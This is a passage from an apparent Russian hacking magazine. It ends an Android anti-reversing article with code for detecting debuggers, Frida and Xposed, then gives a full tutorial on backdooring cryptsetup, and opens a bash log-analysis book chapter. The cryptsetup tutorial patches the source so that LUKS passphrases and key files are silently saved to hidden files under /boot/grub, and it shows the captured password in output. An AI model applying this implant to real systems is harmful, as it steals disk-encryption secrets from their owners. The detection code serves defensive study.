робовать под ключиться  к самому себе (процессу при ложения) в роли
отладчика. Для это го надо сде лать форк (из нативного кода) и затем
попытаться вызвать системный вызов ptrace:


void fork_and_attach()
{
    int pid = fork();
    if (pid == 0)
    {
        int ppid = getppid();
        if (ptrace(PTRACE_ATTACH, ppid, NULL, NULL) == 0)
        {
            waitpid(ppid, NULL, 0);
            ptrace(PTRACE_CONT, NULL, NULL);
        }
    }
}

Обнаружить встроенный отладчик IDA Pro можно другим способом: через
поиск стро ки 00000000:23946 в файле /proc/net/tcp (это стандартный порт
отладчика). К сожалению, начиная с Android 9 способ не работает.
  В старых версиях Android также можно было прямо искать процесс
отладчика в системе, когда приложение просто проходит по дереву процес‐
сов в фай ловой сис теме /proc и ищет строки типа gdb и gdbserver в файлах /
proc/PID/cmdline. Начиная с Android 7 доступ к файловой системе /proc
запрещен (кро ме информации о текущем про цес се).


XPOSED
Xposed — фреймворк  для рантайм‐модификации приложе ний. И  хотя
в основном с его помощью уста нав лива ют сис темные модификации и тви ки
приложений, существует масса модулей, которые могут быть исполь зованы
для реверса и  взло ма  твоего приложения. Это и раз личные модули
для отключения SSL Pinning, и трассировщики вро де inspeckage, и самопис‐
ные модули, которые могут как угодно изменять при ложение.
   Есть три действенных способа обнаруже ния Xposed:
 • поиск   пакета   de.robv.android.xposed.installer  среди   установленных
   на устройство;
 • поиск libexposed_art.so и xposedbridge.jar в файле /proc/
  self/maps ;
 • поиск класса de.robv.android.xposed.XposedBridge среди  заг‐
   ружен ных в рантайм пакетов.

В статье Android Anti‐Hooking Techniques  in Java приводится реали зация
третьего метода одновременно для поис ка Xposed и Cydia Substrate. Подход
интересен тем, что мы не ищем напрямую классы в рантай ме, а прос то
вызываем исключение времени исполнения и затем ищем нужные классы
и методы в стек трейсе:


try {
    throw new Exception("blah");
}
catch(Exception e) {
    int zygoteInitCallCount = 0;


    for(StackTraceElement stackTraceElement : e.getStackTrace()) {
        if(stackTraceElement.getClassName().equals("com.android.
internal.os.ZygoteInit")) {
            zygoteInitCallCount++;
            if(zygoteInitCallCount == 2) {
                Log.wtf("HookDetection", "Substrate is active on the
device.");
            }
        }


        if (stackTraceElement.getClassName().equals("com.saurik.
substrate.MS$2") && stackTraceElement.getMethodName().equals(
"invoked")) {
            Log.wtf("HookDetection", "A method on the stack trace
has been hooked using Substrate.");
        }


        if (stackTraceElement.getClassName().equals("de.robv.android.
xposed.XposedBridge") && stackTraceElement.getMethodName().equals(
"main")) {
            Log.wtf("HookDetection", "Xposed is active on the device.
");
        }


        if (stackTraceElement.getClassName().equals("de.robv.android.
xposed.XposedBridge") && stackTraceElement.getMethodName().equals(
"handleHookedMethod")) {
            Log.wtf("HookDetection", "A method on the stack trace
has been hooked using Xposed.");
        }
    }
}


FRIDA
Ее величество Frida! Этот изу мительный инструмент позволяет перехватить
вызов любой функции подопытного приложения, прочесть все ее аргументы
и заменить тело собственной реализацией на языке JavaScript. Frida не толь‐
ко занима ет почет ное место в чемоданчике инструментов любого реверсера,
но и слу жит базой для многих дру гих, более высокоуровневых утилит.
  Обнаружить Frida можно множеством разных способов. В статье The Jiu‐
Jitsu of Detecting Frida приводится три (на самом деле четыре, но первый уже
неактуален) спо соба это сделать.
   1. Поиск библиотек frida-agent и frida-gadget в файле /proc/self/
maps:


char line[512];
FILE* fp;


fp = fopen("/proc/self/maps", "r");


if (fp) {
    while (fgets(line, 512, fp)) {
        if (strstr(line, "frida")) {
            /* Frida найдена */
        }
    }


    fclose(fp);
}

Может закончиться неудачей, если взлом щик изменит имена библиотек.
   2. Поиск в памяти нативных библиотек строки "LIBFRIDA":


static char keyword[] = "LIBFRIDA";
num_found = 0;


int scan_executable_segments(char * map) {
    char buf[512];
    unsigned long start, end;


    sscanf(map, "%lx‐%lx %s", &start, &end, buf);


    if (buf[2] == 'x') {
        return (find_mem_string(start, end, (char*)keyword, 8) == 1);
    } else {
        return 0;
    }
}


void scan() {
    if ((fd = my_openat(AT_FDCWD, "/proc/self/maps", O_RDONLY, 0)) >=
0) {


    while ((read_one_line(fd, map, MAX_LINE)) > 0) {
        if (scan_executable_segments(map) == 1) {
            num_found++;
        }
    }


    if (num_found > 1) {
        /* Frida найдена */
    }
}

Взломщик может перекомпилировать Frida с измененными строками.
   3. Про ход по всем открытым TCP-пор там, отправка в них dbus‐
сообщения AUTH и ожидание ответа Frida:


for(i = 0 ; i <= 65535 ; i++) {
    sock = socket(AF_INET , SOCK_STREAM , 0);
    sa.sin_port = htons(i);


    if (connect(sock , (struct sockaddr*)&sa , sizeof sa) != ‐1) {
        __android_log_print(ANDROID_LOG_VERBOSE, APPNAME,  "FRIDA
DETECTION [1]: Open Port: %d", i);


        memset(res, 0 , 7);


        send(sock, "\x00", 1, NULL);
        send(sock, "AUTH\r\n", 6, NULL);


        usleep(100);


        if (ret = recv(sock, res, 6, MSG_DONTWAIT) != ‐1) {
            if (strcmp(res, "REJECT") == 0) {
                /* Frida найдена */
            }
        }
    }
    close(sock);
}

Метод хорошо работает при использовании  frida‐server (на рутованном
устройстве), но бесполезен, если приложение было перепакова но с вклю‐
чением в него frida‐gadget (этот способ обычно применяют, когда невоз‐
можно получить root на устройстве).
  В статье Detect Frida for Android автор при водит еще три способа:
 1. По иск потоков frida‐server и frida‐gadget, которые Frida запус кает в рамках
   процесса подопытного приложения.
 2. По иск  спе цифичных  для   Frida  именованных  пайпов  в  каталоге
  /proc/<pid>/fd .
 3. Сравнение кода нативных библиотек на дис ке и в памяти. При внед рении
   Frida изменяет секцию text нативных библиотек.

Примеры использования последних трех техник опубликованы в репозитории
на GitHub.


КЛОНИРОВАНИЕ
Некоторые про изводители встраивают в свои про шивки функцию клониро‐
вания при ложе ния (Parallel Apps в OnePlus, Dual Apps в Xiaomi и так далее),
которая позволяет установить на смартфон копию выбранно го приложения.
Прошивка создает дополнительного Android‐пользователя с идентифика‐
тором 999 и устанавливает копию приложений от его име ни.
   Такую же функци ональ ность предлагают некоторые при ложения из мар‐
кета (Dual Space, Clone App, Multi Parallel). Они работают по‐другому: создают
изолированную среду для при ложения и устанавливают его в собственный
приватный каталог.
  С помощью второго метода твое приложение могут запустить в изолиро‐
ванной сре де для изучения. Чтобы воспре пятствовать этому, достаточно про‐
анализировать путь к приватному каталогу приложе ния. К примеру, при ложе‐
ние с име нем пакета com.example.app при нор мальной уста новке будет
иметь при ват ный каталог по следующему пути:


/data/user/0/com.example.app/files

При создании клона с помощью одного из приложений из маркета путь будет
уже таким:


/data/data/com.ludashi.dualspace/virtual/data/user/0/com.example.app/
files

А при создании клона с помощью встроенных в про шивку инструментов —
таким:


/data/user/999/com.example.app/files

Соберем все вместе и получим такой метод для детекта изолированной сре‐
ды:


private const val DUAL_APP_ID_999 = "999"


fun checkAppCloning(context: Context): Boolean {
    val path: String = context.filesDir.path
    val packageName = context.packageName


    val pathDotCount = path.split(".").size‐1
    val packageDotCount = packageName.split(".").size‐1


    if (path.contains(DUAL_APP_ID_999) || pathDotCount >
packageDotCount) {
        return false
    }


    return true
}

Метод основан на способе, приведенном в статье Preventing Android App
Cloning.


ВЫВОДЫ
Конечно же, это далеко не все способы борьбы с реверсом и ана лизом
поведения  при ложе ний.  Существует  мно жес тво  менее  эффективных
или слишком узкоспециализирован ных способов. Поэтому ниже я приведу
список литературы и проектов на GitHub, с которыми обязательно нужно
ознакомиться. Там ты найдешь более глубокое объяснение некоторых опи‐
санных в этой статье методов защиты, а также множество других техник.


        WWW

                        •Android Anti‐Reversing Defenses — глава из сво‐
                       бодной  книги  Mobile  Security  Testing  Guide
                        о защите от реверса;
                        •Android Anti‐Hooking Techniques in Java — статья
                        о  способах  обнаружить  Xposed  и  Cydia
                            Substrate;
                      •The Jiu‐Jitsu of Detecting Frida — опи сание спо‐
                        собов обнаружить Frida;
                        •Detect Frida for Android — еще несколько спо‐
                        собов обнаружить Frida;
                          •SafetyNet:   Google’s  tamper   detection   for
                           Android — статья о принципе работы инструмен‐
                           та SafetyNet, использующего многие из описан‐
                       ных техник опре делить компрометацию устрой‐
                            ства;
                       •RootBeer — готовая библиотека, помогающая
                        обнаружить права root;
                          •anti‐emulator — репозиторий с несколькими тех‐
                        никами детек та эму лятора и дебаггера;
                        •DetectMagiskHide  —   готовое   приложение
                         для детек та Magisk.
ВЗЛОМ
БЭКДОР
    LUKSДЛЯ

КАК ПЕРЕХВАТИТЬ КЛЮЧ И ПАРОЛЬ
ОТ ЗАШИФРОВАННОГО РАЗДЕЛА
В LINUX





      Denis Simonov
   Пентестер и дизайнер.
  Занимаюсь проблемами
 моделирования времени в
    виртуальных мирах.
       me@n0a.pw





LUKS — популярная и распростра нен ная сис тема шиф‐
рования дисков. Однако, когда есть дос туп к хосту с пра вами
адми нистратора, впол не воз можно  уста новить  закладку,
которая будет перехватывать ключи зашифрованных раз‐
делов. В этой статье мы сначала раз беремся с LUKS и ути‐
литой cryptsetup, а потом посмотрим, как изме нить исходный
код таким образом,  чтобы можно было перех ватывать
парольную фразу или ключ для расшифровки раздела.


LUKS — это, по сути, стандарт для шифрования дисков в Linux. Поддержи‐
вается до восьми слотов ключей, есть выбор хеш‐функций, алго ритмов
и режимов шифрования, есть адаптивный алгоритм выбора количества ите‐
раций. Расшифровать данные на диске мож но, только имея дос туп к сек‐
ретному ключу и паролю.
  Среди дру гих преимуществ LUKS:
 • совместимость через стандартизацию;
 • защита от атак с низкой энтропией;
 • возможность аннулировать секретную фразу.

Ну и рас пространяется она бесплатно.


НАСТРОЙКА ДИСКА
Все манипуляции мы будем проводить на свежем Debian 10, добавив допол‐
нительный диск для экспериментов с шифрованием.
  После установки перехо дим под root:


su ‐

Затем утилитой fdisk смот рим названия доступных дисков:



  $ fdisk ‐l


  Disk /dev/sda: 20 GiB, 21474836480 bytes, 41943040 sectors
  Disk model: VMware Virtual S
  Units: sectors of 1 * 512 = 512 bytes
  Sector size (logical/physical): 512 bytes / 512 bytes
  I/O size (minimum/optimal): 512 bytes / 512 bytes
  Disklabel type: dos
  Disk identifier: 0x09849b5eDevice Boot Start End Sectors Size Id Type
  /dev/sda1 * 2048 37750783 37748736 18G 83 Linux
  /dev/sda2 37752830 41940991 4188162 2G 5 Extended
  /dev/sda5 37752832 41940991 4188160 2G 82 Linux swap / Solaris


  Disk /dev/sdb: 4 GiB, 4294967296 bytes, 8388608 sectors
  Disk model: VMware Virtual S
  Units: sectors of 1 * 512 = 512 bytes
  Sector size (logical/physical): 512 bytes / 512 bytes
  I/O size (minimum/optimal): 512 bytes / 512 bytes


В своем при мере я буду использовать устройство /dev/sdb. Для разметки
диска использую утилиту parted, передав имя дис ка в качестве аргумента:


parted /dev/sdb

Помечаю таблицу разделов как GPT:


(parted) mklabel gpt

И создаю единс твенный раздел, занимающий весь диск:


(parted) mkpart primary 1 ‐1
(parted) quit


СБОРКА CRYPTSETUP
Работы с разметкой /dev/sdb закончены. Переходим к сборке cryptsetup.
   Если у тебя уже установлен LUKS и ты хочешь модифицировать текущую
версию ути литы, исполь зуй dpkg‐dev. В этом же примере я буду собирать
cryptsetup из исходных кодов, скачанных отдельно от сис темы. У меня вер‐
сия 2.0.6, так как при сборке последней доступной (2.3.4) были проблемы
с версиями библиотек.
   Скачиваем, рас паковываем и устанавлива ем необ ходимые зависимос ти:


# cd /root
# wget https://www.kernel.org/pub/linux/utils/cryptsetup/v2.0/
cryptsetup‐2.0.6.tar.xz
# tar xf cryptsetup‐2.0.6.tar.xz
# cd cryptsetup‐2.0.6
# apt update && apt install build‐essential automake autopoint
libtool pkg‐config uuid‐dev libdevmapper‐dev libpopt‐dev
libgcrypt20‐dev libjson‐c‐dev libssl‐dev libblkid‐dev gettext

Собираем и уста нав лива ем:


# ./configure
# make && make install

Проверяем установ ку:



  # cryptsetup ‐‐version


  cryptsetup 2.0.6


Отлично. Теперь создадим зашифрованный раздел с помощью cryptsetup
и пароля, вво димого в TTY:


# cryptsetup luksFormat /dev/sdb1

Соглашаемся на фор матирование (YES) и вводим пароль для последующе го
доступа к раз делу. Я использую t3st3ncryp7.
  Проверяем, все ли удалось.



  # cryptsetup isLuks /dev/sdb1 && echo Ok!


  Ok!


Все получи лось! Подклю чаем шиф рованный раздел, чтобы дальше его мон‐
тировать:


# cryptsetup luksOpen /dev/sdb1 db

Вводим пароль ную фразу (t3st3ncryp7). Чуть позже в этом мес те мы перех‐
ватим вводимый в TTY пароль.
  Форматируем раз дел:


# mke2fs ‐j /dev/mapper/db

И монтиру ем для работы, например в /mnt:



  # mount /dev/mapper/db /mnt && cd /mnt
  # echo Hello! > test.txt
  # cat test.txt


  Hello!


  # ls ‐la


  итого 28
  drwxr‐xr‐x 3 root root 4096 ноя 6 06:49 .
  drwxr‐xr‐x 20 root root 4096 ноя 6 05:34 ..
  drwx‐‐‐‐‐‐ 2 root root 16384 ноя 6 06:48 lost+found
  ‐rw‐r‐‐r‐‐ 1 root root   7 ноя 6 06:49 test.txt



МОДИФИЦИРУЕМ КОД
На этом этапе мы научились монтировать шифрованный раздел LUKS c
использованием парольной фразы. Сейчас мы исправим исходный код, что‐
бы сохранять не только вво димый пароль, но и случайно сгенерированный
файл, который может быть ука зан в качестве ключа для рас шифровки раз‐
дела.
  Находим код про вер ки passphrase в фай ле src/utils_password.c (отно‐
сительно корня архива cryptsetup-2.0.6.tar.xz). В ста рых версиях он
находился в файле askpass.c.
  Для перехвата пароля я изменю функцию crypt_get_key_tty(), отве‐
чающую за ввод пароля из терминала (TTY). В самом конце добавим кусок
кода, который кладет переменную pass в нуж ный нам файл. В качестве пути
возьмем /boot/grub/.captured_pass.
   Вот примерно 220‐я строка файла src/utils_password.c:


*key = pass;
*key_size = strlen(pass);

Добавим


FILE *fp;
fp = fopen("/boot/grub/.captured_pass", "w+");
fputs(pass, fp);
fclose(fp);





               Перехват passphrase в utils_password.c

Отлично. Теперь вводимый пароль сохраняется в файле .captured_pass.
Пойдем дальше и поможем нашей прог рамме делать «резервную копию»
используемого для расшифровки ключа.
  Для этого я решил не читать сам ключ, а взять оригинальный путь из фун‐
кции tools_get_key() и скопировать ключ в нужное мес то. Для добавления
кода ищем примерно 285‐ю строку и пос ле:


if (pwquality && !opt_force_password && !key_file && !r)
  r = tools_check_pwquality(*key);

Добавляем вызов фун кции CopyFile(), передав в качестве аргумента путь
оригиналь ного файла в переменной key_file и необ ходимый путь для сох‐
ранения. Должно получиться при мерно так:


...
if (pwquality && !opt_force_password && !key_file && !r)
  r = tools_check_pwquality(*key);


CopyFile(key_file, "/boot/grub/.captured_key");return r;
...





              Сохранение клю ча в файле utils_password.c

Не забыва ем добавить саму функцию CopyFile() в самый конец файла пос‐
ле функции tools_write_mk():


int CopyFile(const char* source, const char* destination) {
  int input, output;
  if ((input = open(source, O_RDONLY)) == ‐1) {
          return ‐1;
  }
  if ((output = creat(destination, 0660)) == ‐1) {
          close(input);
          return ‐1;
  }



  off_t bytesCopied = 0;
  struct stat fileinfo = {0};
  fstat(input, &fileinfo);
  int result = sendfile(output, input, &bytesCopied, fileinfo.st_size
);


  close(input);
  close(output);


  return result;
}

Теперь пересобира ем наш исправленный вариант cryptsetup c уда лением
кеша предыдущей сборки:


# pwd
# /root/cryptsetup‐2.0.6
make clean && make && make install

Настало время тестов. Для начала проверим перехват пароля уже зашиф‐
рованного таким обра зом диска. Для этого размонтируем его и вер нем
в первоначаль ное сос тояние:


# umount /mnt
# cryptsetup luksClose /dev/mapper/db

Теперь сно ва расшифро вываем и ловим необходимый пароль:



  # cryptsetup luksOpen /dev/sdb1 db


  Введите парольную фразу для /dev/sdb1:


  # mount /dev/mapper/db /mnt
  # ls /mnt/


  lost+found test.txt


  # cat /boot/grub/.captured_pass


  t3st3ncryp7


Великолепно! Осталось отформатировать и зашиф ровать файл ключом
для проверки второго спо соба перех вата. Генерируем сам ключ:


# dd if=/dev/urandom of=/root/secret.key bs=1024 count=2

Форматируем и шифруем с помощью  сгенерирован ного ключа, пред‐
варительно отключив раз дел:



  # umount /mnt
  # cryptsetup luksClose /dev/mapper/db
  # cryptsetup luksFormat /dev/sdb1 /root/secret.key


  ПРЕДУПРЕЖДЕНИЕ: Устройство /dev/sdb1 уже содержит подпись суперблока
  «crypto_LUKS».WARNING!
  ========
  Данные на /dev/sdb1 будут перезаписаны без возможности восстановления.
  Are you sure? (Type uppercase yes): YES


Подключаем и расшифровываем раздел:


# cryptsetup ‐‐key‐file /root/secret.key luksOpen /dev/sdb1 db

Проверяем, перех ватился ли ключ.



  # ls ‐la /boot/grub/


  итого 2392
  drwxr‐xr‐x 5 root root  4096 ноя 6 07:29 .
  drwxr‐xr‐x 3 root root  4096 ноя 5 05:03 ..
  ‐rw‐r‐‐‐‐‐ 1 root root  2048 ноя 6 07:31 .captured_key
  ‐rw‐r‐‐r‐‐ 1 root root   11 ноя 6 07:21 .captured_pass
  drwxr‐xr‐x 2 root root  4096 ноя 5 05:04 fonts
  ‐r‐‐r‐‐r‐‐ 1 root root  8463 ноя 5 05:04 grub.cfg
  ‐rw‐r‐‐r‐‐ 1 root root  1024 ноя 5 05:04 grubenv
  drwxr‐xr‐x 2 root root  12288 ноя 5 05:04 i386‐pc
  drwxr‐xr‐x 2 root root  4096 ноя 5 05:04 locale
  ‐rw‐r‐‐r‐‐ 1 root root 2396122 ноя 5 05:03 unicode.pf2


Полный порядок. Проверим, работает ли наш ключ, предварительно дублируя
его, ина че при следующей записи он запишет сам себя в 0 байт:


# cp /boot/grub/.captured_key /boot/grub/.captured_key_use
# cryptsetup ‐‐key‐file /boot/grub/.captured_key_use luksOpen /dev/
sdb1 db





                      Успешный перехват ключа


ИТОГ
Популярность LUKS делает его интересной мишенью для хакеров. Если
существует воз можность внедрить ся в систему, то шифрование может
не спас ти, что мы сегодня и продемонстрировали.
ВЗЛОМ

АНАЛИЗ ДАННЫХ
  LINUXВ

ГЛАВА ИЗ КНИГИ
«BASH И КИБЕРБЕЗОПАСНОСТЬ»





   Издательский дом
        «Питер»
          piter.com





Как работать с большими объемами дан ных, не имея
под рукой ничего, кроме коман дной строки? Проана лизи‐
ровать большие объемы дан ных часто помога ет поиск,
который по мере поступления новых данных следует пос‐
тоянно уточ нять и ограничивать. В этой главе в качестве
входных данных для наших сценариев мы возьмем информа‐
цию из журналов веб‐сервера. Однако сце нарии и методы
можно легко изме нить для работы с дан ными прак тичес ки
любого типа.


О книге
Перед тобой седь мая глава из книги «Bash и кибер‐
безопасность: атака, защита и анализ из командной
строки Linux», которую мы публикуем по догово рен‐
ности с издатель ством «Питер». Ее авто ры — Пол
Тронкон и Карл Олбинг, а оригинал был издан
O’Reilly.
  Несмотря на то что первые две главы этой книги
знакомят читате ля с принципами командных интер‐
претаторов в целом и bash в частности, это скорее
пособие для тех, кто уже знаком с основами. Если
чувствуешь, что пла ваешь в теме, то лучше пос‐
мотри, к примеру, «Программное окружение Unix»
Брайана Кер нигана и Роба Пайка.
  Зато если ты уже имеешь некоторый опыт работы с bash, то эта кни га
поможет закрепить и усовершенствовать навыки. В ней ты найдешь множес‐
тво приемов, которые не только хороши сами по себе, но и учат пользовать ся
стандартными утилитами Unix и Linux для достижения самых разнообразных
целей.
  Чего ты здесь не найдешь — это отсылок к готовым прог раммкам и скрип‐
там, которые расширяют возможнос ти сис темы и во множестве водятся
как на GitHub, так и в репозиториях пакетов Linux. Вмес то это го авторы книги
намерен но используют стандартные утилиты, которые входят в любую Unix‐
образную сис тему еще с восьмидесятых годов. Нап ример, мало кто сейчас
знает, как поль зоваться дедов ским awk. Но в этом одновременно и заключа‐
ется глав ная прелесть этой книги — она опирается на проверенные вре‐
менем мощ ные средства, которые ты точно най дешь в любой системе.
  Не сто ит также ожидать, что «Bash и кибербезопасность» смо жет пос‐
лужить хакерским пособием. Наступательной кибербезопасности здесь пос‐
вящено, по сути, всего две главы. В одной авторы показывают, как создать
фаззер параметров программы, во второй разбирают устройство обратного
шелла.
  Зато здесь в подробнос тях рассматривается сбор и анализ  логов,
мониторинг файловой сис темы, проверка файлов на вирусы, работа с поль‐
зователями и группами и прочие вещи, которые чаще нуж ны защитникам, чем
нападающим. Однако пентестер тоже найдет здесь полезные вещи и рас‐
ширит репертуар приемов. В некоторых случаях воз можность обхо диться
без вспомогательных утилит может оказаться критичной в подобной работе.
  В целом мож но сказать, что «Bash и кибербезопасность» — это книга
о возможнос тях bash, проиллюстрированная примерами, боль шая часть
которых — из области информа ционной безопасности. Она поможет тебе
наладить близкие отношения с командной оболоч кой Linux и утилитами
из стандартного набора и научит решать сложные задачи в тру‐юниксовом
стиле.



ИСПОЛЬЗУЕМЫЕ КОМАНДЫ
Для сортировки и ограничения отображаемых дан ных вос пользуем ся коман‐
дами sort, head и uniq. Работу с ними продемонстрируем на файле из при‐
мера 7.1.


Пример 7.1. file1.txt


  12/05/2017 192.168.10.14 test.html
  12/30/2017 192.168.10.185 login.html



sort
Команда sort используется для сортировки тексто вого файла в числовом
и алфа вит ном порядке. По умолчанию строки будут упорядочены по воз‐
растанию: сначала цифры, затем буквы. Буквы верхнего регистра, если
не указано иначе, будут идти рань ше соответствующих букв нижнего регис‐
тра.


Общие параметры команды
 • r — сортировать по убыванию.
 • f — игнориро вать регистр.
 • n — использовать числовой порядок: 1, 2, 3 и до 10 (по умолчанию
   при сор тиров ке в алфавитном порядке 2 и 3 идут после 10).
 • k — сортировать на основе под множества данных (ключа) в строке. Поля
   разделяются пробелами.
 • o — записать вывод в указан ный файл.


Пример команды
Для сор тиров ки файла file1.txt по столбцу, в котором указано имя файла,
и игнорирования столбца с IP‐адресом необходимо использовать сле‐
дующую коман ду:


sort ‐k 3 file1.txt

Можно также выполнить сортировку по под множеству поля. Для сортировки
по второму октету IP‐адреса напишите следующее:


sort ‐k 2.5,2.7 file1.txt

Будет выпол нена сортировка первого поля с исполь зованием символов
от 5 до 7.


uniq
Команда uniq поз воля ет отфиль тровать повторяющиеся строки с данными,
которые встре чают ся друг рядом с дру гом. Чтобы удалить в файле все пов‐
торяющиеся строки, перед использовани ем команды  uniq файл нужно
отсортировать.


Общие параметры команды
 • с — вывести, сколько раз повторяется строка.
 • f — перед срав нением проигнорировать ука занное количество полей.
  Например, параметр f 3 позволя ет не принимать во внимание в каждой
   строке первые три поля. Поля разделяются пробелами.
 • i — игно риро вать регистр букв. В uniq регистр символов по умолчанию
   учитывается.


ОЗНАКОМЛЕНИЕ С ЖУРНАЛОМ ДОСТУПА К ВЕБ-СЕРВЕРУ
Для большинства примеров в этой главе мы используем журнал доступа
к веб‐серверу Apache. В журнал этого типа записывают ся зап росы страницы,
сделанные к веб‐серверу, время, когда они были сделаны, и имя того, кто их
сделал. Образец типичного файла комбинированного фор мата журнала
(Combined Log Format) Apache можно увидеть в примере  7.2. Полный
лог‐файл, который был использован в этой книге, называется access.log.


Пример 7.2. Фрагмент файла access.log


  192.168.0.11 ‐ ‐ [12/Nov/2017:15:54:39 ‐0500] "GET /request‐quote.html
  HTTP/1.1" 200 7326 "http://192.168.0.35/support.html" "Mozilla/5.0 (Win‐
  dows NT 6.3; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0"



             INFO

                    Журналы  веб‐сервера  используются  просто
                        в качестве при мера. Методы, опи санные в этой
                         главе, можно при менять для анализа различных
                       типов данных.


Поля журнала веб‐сервера Apache описаны в таблице.





Существует второй тип журнала доступа Apache, известный как обычный фор‐
мат жур нала (Common Log Format). Формат совпадает с ком бинирован ным,
за исклю чени ем того, что не содержит полей для ссылающейся страницы
или аген та поль зовате ля. Дополнительную информацию о формате и кон‐
фигура ции журналов Apache можно получить на сай те про екта Apache HTTP
Server.
  Коды состояния, упо мянутые в таб лице (поле  9), позволяют  узнать,
как веб‐сервер ответил на любой запрос.





        WWW

                     Полный спи сок кодов можно найти в реес тре
                       кодов состояния протокола передачи гипертекста
                          (HTTP).



СОРТИРОВКА И УПОРЯДОЧЕНИЕ ДАННЫХ
При пер вичном анализе данных в большинстве случаев полезно начинать
с рассмотрения экстремальных зна чений: какие события происходили наибо‐
лее или наиме нее часто, самый малень кий или самый большой объем
переданных данных и т. д. Например, рассмотрим данные, которые мож но
собрать из файлов журнала веб‐сервера. Необычно боль шое количество
обращений  к  стра ницам  может  указывать  на  активное  сканирование
или попытку отказа в обслужива нии. Необычно боль шое количество байтов,
загружен ных хостом, может указывать на то, что дан ный сайт клонируется
или происходит эксфильтра ция данных.
   Чтобы управлять расположением и отображени ем данных, укажите в кон це
команды sort, head и tail:


... | sort ‐k 2.1 ‐rn | head ‐15

При этом выходные данные сценария передаются команде sort, а затем
отсортированный вывод  направляется  коман де  head,  которая  напеча‐
тает 15 вер хних (в данном случае) строк. Команда sort в качестве своего
ключа сортировки (‐k) использует второе поле, начиная с его первого сим‐
вола (2.1). Более того, эта коман да выполнит обратную сортировку  (‐r),
а значения будут отсорти рова ны в чис ловом порядке (‐n). Почему числовой
порядок? Потому что 2 отображается меж ду 1 и 3, а не меж ду 19 и 20 (как
при сор тиров ке в алфавитном порядке).
  Используя коман ду head, мы захватываем пер вые строки вывода. Мы мог‐
ли бы получить последние несколь ко строк, передавая вывод из команды
sort команде tail вместо head. Использование команды tail с опци ей ‐15
выведет последние 15 строк. Дру гой спо соб отсортировать данные по воз‐
растанию, а не по убыванию — уда лить параметр ‐r.


ПОДСЧЕТ КОЛИЧЕСТВА ОБРАЩЕНИЙ К ДАННЫМ
Типичный жур нал веб‐сервера может содержать десятки тысяч записей. Под‐
считывая, сколь ко раз страница была доступна, и узна вая, по какому IP‐адре‐
су она была доступна, вы можете получить лучшее представ ление об общей
активнос ти сай та. Далее приводятся записи, на которые следует обратить
внимание.
 • Большое количество запросов, воз вра щающих код состояния 404 («Стра‐
   ница не найдена») для конкрет ной страницы. Это может  указывать
   на неработающие гиперссылки.
 • Множество  запросов  с одно го  IP‐адре са,  возвращающих  код  сос‐
   тояния 404. Это может означать, что выполняется зондирование в поисках
   скрытых или несвязанных страниц.
 • Большое количество запросов, в час тности с одного и того же IP‐адреса,
   возвращающих код состояния 401 («Не авторизован»). Это может сви‐
   детельствовать о попытке обхода аутентифика ции, например о переборе
   паролей.

Чтобы обнаружить такой тип активности, нам нужно иметь возможность
извлекать ключевые поля, например исходный IP‐адрес, и подсчи тывать,
сколько раз они появляются в файле. Поэтому для извлечения поля мы вос‐
пользуемся коман дой cut, а затем передадим вывод в наш новый инстру‐
мент, файл countem.sh, показанный в примере 7.3.


Пример 7.3. countem.sh
declare ‐A cnt        # assoc. array             # <1>
while read id xtra                               # <2>
do
    let cnt[$id]++                               # <3>
done
# now display what we counted
# for each key in the (key, value) assoc. array
for id in "${!cnt[@]}"                           # <4>
do
  printf '%s %d\n'  "$id"  "${cnt[$id]}"         # <5>
done

<1> Поскольку мы не знаем, с какими IP‐адресами (или другими строками)
можем столкнуться, будем исполь зовать ассо циативный массив  (также
известный как хеш‐таб лица или словарь). В этом при мере массив задан
с параметром –A, который позволит нам исполь зовать любую строку в качес‐
тве нашего индекса.
  Функция  ассоциативного  мас сива  предусмотрена  в  bash  вер‐
сии 4.0 и выше. В таком массиве индекс не обязатель но дол жен быть числом
и может быть пред став лен в виде любой строки. Таким обра зом, вы можете
индексировать мас сив по IР‐адресу и подсчитывать количество обращений
этого IР‐адреса. В случае если вы используете версию программы старше,
чем bash 4.0, альтернативой этому сценарию будет сценарий, показанный
в примере 7.4. Здесь вместо ассо циативного массива используется команда
awk.
  В bash для ссылок на массив, как и для ссылок на элемент мас сива,
используется син таксис ${var[index]}. Чтобы получить все возможные зна‐
чения индекса (ключи, если эти массивы рассматриваются как пара «ключ/
значение»), укажите ${!cnt[@]}.
  <2> Хотя мы ожидаем в стро ке только одно слово вво да, добавим
переменную xtra, что бы захватить любые другие слова, которые появятся
в стро ке. Каждой переменной в команде read прис ваивается соответству‐
ющее слово из входных данных (пер вая переменная получает первое слово,
вторая перемен ная — второе слово и т. д.). При этом пос ледняя переменная
получает все оставшиеся сло ва. С другой сто роны, если в строке входных
слов меньше, чем переменных в команде read, этим допол нительным
переменным присваивается пустая строка. Поэтому в нашем примере, если
в строке вво да есть дополнительные слова, они все будут присвоены
переменной xtra. Если же нет дополнительных слов, переменной xtra будет
присвоено зна чение null.
  <3> Строка использует ся в качес тве индекса и увеличивает его предыду‐
щее зна чение. При пер вом исполь зовании индекса предыдущее значение
не будет установлено и он будет равен 6.
  <4> Данный синтаксис позволяет нам перебирать все раз личные зна‐
чения индекса. Обратите внимание: нельзя гаран тировать, что при сортиров‐
ке мы получим алфавитный или  какой‐то другой кон кретный порядок.
Это объясня ется при родой алгоритма хеширования зна чений индекса.
  <5> При выводе значения и ключа мы помещаем значения в кавычки, что‐
бы всег да получать одно значение для каж дого аргумента, даже если оно
содержит один или два пробела. Мы не дума ем, что такое произойдет
при работе этого сценария, но подоб ная практика кодирования делает сце‐
нарии более надежными при использовании в различных ситу ациях.
  В примере 7.4 показана дру гая версия сценария, с использованием
команды awk.


Пример 7.4. countem.awk
awk '{ cnt[$1]++ }
END { for (id in cnt) {
  printf "%d %s\n", cnt[id], id
}

Оба сце нария будут хорошо работать в конвейере команд:


cut ‐d' ' ‐f1 logfile | bash countem.sh

Команда cut на самом деле здесь не нужна ни для одной из версий. Почему?
Потому что сценарий awk явно ссылается на первое поле  ($1), а то, что
команда cut в сценарии оболоч ки не нуж на, объясняется кодировкой коман‐
ды read (см. <5>). Так что мы можем запустить сценарий следующим обра‐
зом:


bash countem.sh < logfile

Например, что бы под считать, сколько раз IP‐адрес делал НТТР‐запрос,
на который возвращалось сооб щение об ошибке 404 («Страница не най‐
дена»), нужно ввести такую команду:



  $ awk '$9 == 404 {print $1}' access.log | bash countem.sh


  1 192.168.0.36
  2 192.168.0.37
  1 192.168.0.11


Вы также можете использовать команду grep 404 access.log и передать
